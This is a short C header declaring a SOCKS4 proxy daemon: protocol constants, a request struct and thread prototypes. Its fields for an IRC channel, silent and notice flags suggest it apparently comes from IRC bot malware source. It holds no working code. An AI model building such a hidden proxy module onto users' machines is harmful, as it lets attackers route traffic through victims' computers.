#ifndef NO_SOCK4SERV
#define SOCKS4_CONNECT 1
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91

// socks4 daemon structure.
typedef struct SOCKS4HEADER 
{
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];

} SOCKS4HEADER;

typedef struct SOCKS4 
{
	SOCKET sock;
	char chan[128];
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;
	int threadnum;
	int port;

} SOCKS4;

 
DWORD WINAPI SocksDaemon(LPVOID param);
DWORD WINAPI Socks4ClientThread(LPVOID pParam);
void transfer_loop(SOCKET targetsock, SOCKET clientsock);
#endif
